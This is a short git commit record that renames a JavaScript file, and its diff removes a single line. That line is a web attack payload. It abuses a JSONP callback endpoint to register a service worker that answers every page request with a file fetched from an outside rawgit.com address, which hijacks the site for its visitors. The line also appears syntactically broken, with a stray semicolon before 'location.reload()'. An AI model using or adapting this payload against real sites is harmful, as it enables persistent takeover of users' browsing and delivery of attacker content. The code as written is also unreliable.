3bc9a5bb3ef4d81df07db01da961fc994a555162
KawaHttp <unxxx1@gmail.com>
2017-01-08 10:09:52 +0100

    Update and rename new6.js to new7.js

--- new6.js
+++
@@ -1,1 +0,0 @@
-navigator.serviceWorker.register("/token.jsonp?callback="+escape('this.addEventListener("fetch",a=>{a.respondWith(fetch("//rawgit.com/KawaHttp/test1/master/e.swf"))});');,location.reload();
